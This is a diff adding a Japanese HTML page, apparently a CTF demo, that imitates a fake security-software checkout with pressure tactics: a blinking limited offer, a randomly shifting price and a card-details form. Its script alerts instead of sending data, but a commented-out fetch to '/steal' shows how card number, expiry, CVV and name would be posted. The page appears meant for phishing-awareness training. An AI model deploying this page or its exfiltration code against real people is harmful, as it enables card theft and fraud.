@@ -1,0 +1,306 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>セキュリティソフト - お支払い</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'MS PGothic', 'Hiragino Kaku Gothic ProN', 'Hiragino Sans', Meiryo, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        
+        .payment-container {
+            background: white;
+            border-radius: 20px;
+            padding: 40px;
+            max-width: 500px;
+            width: 100%;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+        }
+        
+        .logo {
+            text-align: center;
+            font-size: 48px;
+            margin-bottom: 20px;
+        }
+        
+        h1 {
+            color: #333;
+            font-size: 28px;
+            margin-bottom: 10px;
+            text-align: center;
+        }
+        
+        .subtitle {
+            text-align: center;
+            color: #666;
+            margin-bottom: 30px;
+            font-size: 14px;
+        }
+        
+        .plan-box {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            padding: 25px;
+            border-radius: 15px;
+            margin-bottom: 25px;
+            text-align: center;
+        }
+        
+        .plan-name {
+            font-size: 24px;
+            font-weight: bold;
+            margin-bottom: 10px;
+        }
+        
+        .price {
+            font-size: 48px;
+            font-weight: bold;
+            margin: 15px 0;
+        }
+        
+        .price-unit {
+            font-size: 20px;
+            font-weight: normal;
+        }
+        
+        .features {
+            list-style: none;
+            margin: 20px 0;
+        }
+        
+        .features li {
+            padding: 10px 0;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.3);
+        }
+        
+        .features li:before {
+            content: "✓ ";
+            font-weight: bold;
+            margin-right: 10px;
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+        }
+        
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            color: #333;
+            font-weight: bold;
+        }
+        
+        .form-group input {
+            width: 100%;
+            padding: 12px;
+            border: 2px solid #ddd;
+            border-radius: 8px;
+            font-size: 16px;
+            transition: border-color 0.3s;
+        }
+        
+        .form-group input:focus {
+            outline: none;
+            border-color: #667eea;
+        }
+        
+        .form-row {
+            display: grid;
+            grid-template-columns: 2fr 1fr;
+            gap: 15px;
+        }
+        
+        .btn-pay {
+            width: 100%;
+            background: linear-gradient(135deg, #ff6b6b 0%, #ee5a6f 100%);
+            color: white;
+            border: none;
+            padding: 18px;
+            font-size: 20px;
+            font-weight: bold;
+            border-radius: 50px;
+            cursor: pointer;
+            box-shadow: 0 10px 30px rgba(255, 107, 107, 0.4);
+            transition: all 0.3s ease;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            margin-top: 10px;
+        }
+        
+        .btn-pay:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 15px 40px rgba(255, 107, 107, 0.6);
+        }
+        
+        .btn-pay:active {
+            transform: translateY(0);
+        }
+        
+        .security-badges {
+            display: flex;
+            justify-content: center;
+            gap: 15px;
+            margin-top: 20px;
+            font-size: 12px;
+            color: #999;
+        }
+        
+        .warning-box {
+            background: #fff3cd;
+            border: 2px solid #ffc107;
+            border-radius: 10px;
+            padding: 15px;
+            margin-top: 20px;
+            text-align: center;
+            font-size: 12px;
+            color: #856404;
+        }
+        
+        .limited-time {
+            background: #ff0000;
+            color: white;
+            padding: 8px 15px;
+            border-radius: 20px;
+            font-size: 12px;
+            font-weight: bold;
+            display: inline-block;
+            margin-bottom: 15px;
+            animation: blink 1s linear infinite;
+        }
+        
+        @keyframes blink {
+            0%, 50% { opacity: 1; }
+            51%, 100% { opacity: 0.7; }
+        }
+    </style>
+</head>
+<body>
+    <div class="payment-container">
+        <div class="logo">🛡️</div>
+        <h1>プレミアムセキュリティ</h1>
+        <p class="subtitle">あなたのデバイスを完全に保護します</p>
+        
+        <div class="limited-time">⚡ 限定オファー - 残り時間わずか</div>
+        
+        <div class="plan-box">
+            <div class="plan-name">年間プラン</div>
+            <div class="price">
+                ¥<span id="price">9,800</span>
+                <span class="price-unit">/年</span>
+            </div>
+            <ul class="features">
+                <li>リアルタイムウイルススキャン</li>
+                <li>24時間365日サポート</li>
+                <li>自動バックアップ機能</li>
+                <li>プライバシー保護</li>
+                <li>無制限デバイス保護</li>
+            </ul>
+        </div>
+        
+        <form id="paymentForm" onsubmit="handlePayment(event)">
+            <div class="form-group">
+                <label>カード番号</label>
+                <input type="text" placeholder="1234 5678 9012 3456" maxlength="19" required>
+            </div>
+            
+            <div class="form-row">
+                <div class="form-group">
+                    <label>有効期限</label>
+                    <input type="text" placeholder="MM/YY" maxlength="5" required>
+                </div>
+                <div class="form-group">
+                    <label>CVV</label>
+                    <input type="text" placeholder="123" maxlength="3" required>
+                </div>
+            </div>
+            
+            <div class="form-group">
+                <label>カード名義人</label>
+                <input type="text" placeholder="TARO YAMADA" required>
+            </div>
+            
+            <button type="submit" class="btn-pay">
+                今すぐ支払う
+            </button>
+        </form>
+        
+        <div class="security-badges">
+            <span>🔒 SSL暗号化</span>
+            <span>✓ 安全な決済</span>
+        </div>
+        
+        <div class="warning-box">
+            <strong>⚠️ 注意事項：</strong><br>
+            このページはCTF学習目的のデモページです。<br>
+            実際の決済は行われません。本物のカード情報を入力しないでください。
+        </div>
+    </div>
+    
+    <script>
+        // カード番号のフォーマット
+        document.querySelector('input[type="text"][placeholder*="1234"]').addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\s/g, '');
+            let formatted = value.match(/.{1,4}/g)?.join(' ') || value;
+            e.target.value = formatted;
+        });
+        
+        // 有効期限のフォーマット
+        document.querySelector('input[placeholder="MM/YY"]').addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\D/g, '');
+            if (value.length >= 2) {
+                value = value.substring(0, 2) + '/' + value.substring(2, 4);
+            }
+            e.target.value = value;
+        });
+        
+        // CVVは数字のみ
+        document.querySelector('input[placeholder="123"]').addEventListener('input', function(e) {
+            e.target.value = e.target.value.replace(/\D/g, '');
+        });
+        
+        // 支払い処理
+        function handlePayment(event) {
+            event.preventDefault();
+            
+            // 実際の攻撃では、ここでカード情報をサーバーに送信
+            alert('⚠️ これはCTF学習用のデモページです。\n実際の攻撃では、ここで入力されたカード情報が攻撃者のサーバーに送信されます。\n\n入力された情報は記録されません。');
+            
+            // 実際の攻撃シナリオでは以下のようなコードを使用：
+            // fetch('/steal', {
+            //     method: 'POST',
+            //     headers: { 'Content-Type': 'application/json' },
+            //     body: JSON.stringify({
+            //         cardNumber: document.querySelector('input[placeholder*="1234"]').value,
+            //         expiry: document.querySelector('input[placeholder="MM/YY"]').value,
+            //         cvv: document.querySelector('input[placeholder="123"]').value,
+            //         name: document.querySelector('input[placeholder="TARO YAMADA"]').value
+            //     })
+            // });
+        }
+        
+        // 価格をランダムに変動させる（心理的圧迫）
+        setInterval(() => {
+            const priceElement = document.getElementById('price');
+            const currentPrice = parseInt(priceElement.textContent.replace(/,/g, ''));
+            const newPrice = currentPrice + Math.floor(Math.random() * 200 - 100);
+            if (newPrice > 8000 && newPrice < 15000) {
+                priceElement.textContent = newPrice.toLocaleString('ja-JP');
+            }
+        }, 3000);
+    </script>
+</body>
+</html>
+
